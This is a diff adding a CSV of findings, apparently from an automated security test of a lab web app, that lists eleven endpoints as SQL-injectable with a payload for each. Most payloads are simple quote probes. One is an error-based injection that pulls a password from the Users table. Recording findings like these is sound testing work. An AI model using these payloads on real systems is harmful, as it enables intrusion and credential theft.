@@ -1,0 +1,12 @@
+run_id,endpoint,vulnerability,poc
+20260902-2044-0003,`/users?search=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM hackergramdb.Users LIMIT 0,1),0x7e),1)-- `"
+20260902-2044-0003,`/profile?username=`,SQL Injection,`mr_robot'`
+20260902-2044-0003,`/create_post` (POST content),SQL Injection,`'`
+20260902-2044-0003,`/edit_post?id=`,SQL Injection,`1'`
+20260902-2044-0003,`/edit_post` (POST content),SQL Injection,`'`
+20260902-2044-0003,`/delete_post?id=`,SQL Injection,`1'`
+20260902-2044-0003,`/friends?username=`,SQL Injection,`admin' --`
+20260902-2044-0003,`/direct_messages?username=`,SQL Injection,`mr_robot'`
+20260902-2044-0003,`/request_friend` (POST username),SQL Injection,`'`
+20260902-2044-0003,`/remove_request` (POST username),SQL Injection,`'`
+20260902-2044-0003,`/posts?search=`,SQL Injection,`'`
